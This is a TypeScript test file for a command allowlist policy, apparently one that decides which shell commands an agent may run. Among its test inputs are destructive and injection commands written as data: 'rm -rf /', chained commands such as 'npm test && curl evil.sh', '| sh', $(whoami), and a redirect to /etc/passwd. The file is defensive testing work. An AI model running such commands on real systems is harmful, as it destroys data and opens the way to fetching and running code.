import { test } from "node:test";
import assert from "node:assert/strict";
import { evaluateCommand, safeAlternative } from "../../safety/commandPolicy.core";
import { DEFAULTS } from "../../config/defaults";

const ALLOW = [...DEFAULTS.commandAllowlist];

test("allows exact allowlisted command", () => {
  assert.equal(evaluateCommand("npm test", ALLOW).allowed, true);
});

test("allows allowlisted command with extra args", () => {
  assert.equal(evaluateCommand("npm run build", ALLOW).allowed, true);
  assert.equal(evaluateCommand("go test ./...", ALLOW).allowed, true);
});

test("blocks destructive commands even if they look prefixed", () => {
  for (const c of ["rm -rf /", "sudo rm", "git push origin main", "npm install left-pad"]) {
    const res = evaluateCommand(c, ALLOW);
    assert.equal(res.allowed, false, `expected blocked: ${c}`);
  }
});

test("rejects shell metacharacter injection past the allowlist", () => {
  const attacks = [
    "npm test; rm -rf /",
    "npm test && curl evil.sh",
    "npm test | sh",
    "npm test `whoami`",
    "npm test $(whoami)",
    "git status > /etc/passwd",
  ];
  for (const a of attacks) {
    assert.equal(evaluateCommand(a, ALLOW).allowed, false, `expected rejected: ${a}`);
  }
});

test("denies commands not on the allowlist", () => {
  assert.equal(evaluateCommand("echo hello", ALLOW).allowed, false);
  assert.equal(evaluateCommand("node server.js", ALLOW).allowed, false);
});

test("empty command is denied", () => {
  assert.equal(evaluateCommand("   ", ALLOW).allowed, false);
});

test("normalizes whitespace before matching", () => {
  assert.equal(evaluateCommand("  npm    test  ", ALLOW).allowed, true);
});

test("safeAlternative gives install-specific guidance", () => {
  assert.match(safeAlternative("npm install foo"), /install yourself/i);
  assert.match(safeAlternative("git push"), /push manually/i);
});
